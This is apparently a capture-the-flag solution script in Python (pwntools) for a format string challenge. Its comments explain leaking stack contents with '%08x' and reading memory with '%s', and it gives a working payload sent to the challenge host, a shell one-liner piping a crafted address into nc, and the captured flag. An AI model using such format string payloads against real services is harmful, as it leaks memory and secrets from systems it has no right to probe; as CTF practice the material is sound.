#A simple format string problem.The %08x character can be used to read the content of the stack.Having the addresses of all the registers 
#and functions stored in the stack we can check the content of each register by using %s character.I found the flag at the 7 address by brute forcing all the 
#addresses!
#Looking for a better way to do it.




from pwn import *

p=remote('hack.bckdr.in',9011)
payload=""
payload+="%08x"*6
payload+="%s"
p.sendline(payload)
p.recv()
p.interactive()

#CTF{D0_1T_Y0R3S3LF}
#Another way !
# (python -c "print '\x06\xdc\xff\xff'+'%08x.'*6+'%s'") |  nc hack.bckdr.in 9011